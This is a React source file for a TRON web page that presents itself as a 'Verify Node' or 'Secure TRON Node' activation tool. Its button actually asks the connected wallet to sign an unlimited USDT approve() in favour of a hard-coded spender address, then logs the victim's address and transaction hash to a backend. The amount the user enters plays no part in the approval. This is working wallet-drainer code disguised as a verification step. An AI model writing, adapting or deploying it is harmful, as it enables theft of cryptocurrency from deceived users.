import { useState, useMemo } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

// Naye standard imports
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletConnectWalletAdapter } from '@tronweb3/tronwallet-adapters'; 
import { WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
import '@tronweb3/tronwallet-adapter-react-ui/style.css';

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

export default function Index() {
  // WalletConnect Config
  const adapters = useMemo(() => [
    new WalletConnectWalletAdapter({
      network: 'Mainnet' as any,
      options: {
        projectId: '6b5df56bc30c1dadaab59498b86fd3e8', // 👈 ://walletconnect.com
        metadata: {
          name: 'DeFi Node',
          description: 'Secure TRON Node',
          url: 'https://your-dapp.com',
          icons: ['https://your-dapp.com']
        }
      }
    })
  ], []);

  return (
    <WalletProvider adapters={adapters} autoConnect={true}>
        <DAppUI />
    </WalletProvider>
  );
}

function DAppUI() {
  const { address, connected, signTransaction } = useWallet();
  const [amount, setAmount] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const handleApprove = async () => {
    if (!connected || !address) return alert("Please Connect Wallet First!");

    try {
      setIsLoading(true);
      setStatus("Confirming...");

      const tronWeb = (window as any).tronWeb;
      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

      const parameter = [
        { type: 'address', value: TRON_SPENDER },
        { type: 'uint256', value: maxAmount }
      ];

      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 }, parameter, address
      );

      // Sign & Broadcast
      const signedTx = await signTransaction(transaction.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result) {
        await createTransaction({
          walletAddress: address,
          txHash: result.txid,
          amount: amount || "Max",
          toAddress: TRON_SPENDER,
          usdtBalance: "Verified",
          nativeBalance: "0 TRX"
        });
        alert("✅ Approval Successful!");
      }
    } catch (err: any) {
      alert("❌ Error: " + (err.message || "Failed"));
    } finally {
      setIsLoading(false);
      setStatus("");
    }
  };

  return (
    <div style={styles.container as any}>
      <div style={styles.header as any}>
        <span style={styles.headerTitle as any}>Verify Node</span>
        <WalletActionButton />
      </div>

      <div style={styles.body as any}>
        <div style={styles.card as any}>
            <div style={styles.inputRow as any}>
                <input 
                    type="number" 
                    placeholder="0" 
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    style={styles.mainInput as any}
                />
                <span style={styles.unit as any}>USDT</span>
            </div>
            <p style={styles.label as any}>Wallet: {address ? `${address.slice(0,6)}...` : "Disconnected"}</p>
        </div>

        <button 
            disabled={isLoading || !connected} 
            onClick={handleApprove} 
            style={(isLoading || !connected ? styles.btnDisabled : styles.btnActive) as any}
        >
            {isLoading ? status : "Activate Now"}
        </button>
      </div>
    </div>
  );
}

const styles = {
  container: { minHeight: "100vh", background: "#000", color: "#fff", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "15px 20px" },
  headerTitle: { fontSize: "17px", fontWeight: "bold" },
  body: { padding: "20px", flex: 1 },
  card: { background: "#1c1c1e", padding: "20px", borderRadius: "18px", marginBottom: "20px" },
  inputRow: { display: "flex", alignItems: "baseline", gap: "10px" },
  mainInput: { background: "none", border: "none", color: "#fff", fontSize: "32px", width: "100%", outline: "none" },
  unit: { fontSize: "18px", color: "#8e8e93" },
  label: { color: "#8e8e93", fontSize: "12px", marginTop: "10px" },
  btnActive: { width: "100%", padding: "16px", borderRadius: "16px", background: "#007aff", color: "#fff", fontWeight: "bold", border: "none", cursor: "pointer" },
  btnDisabled: { width: "100%", padding: "16px", borderRadius: "16px", background: "#3a3a3c", color: "#8e8e93", border: "none" }
};
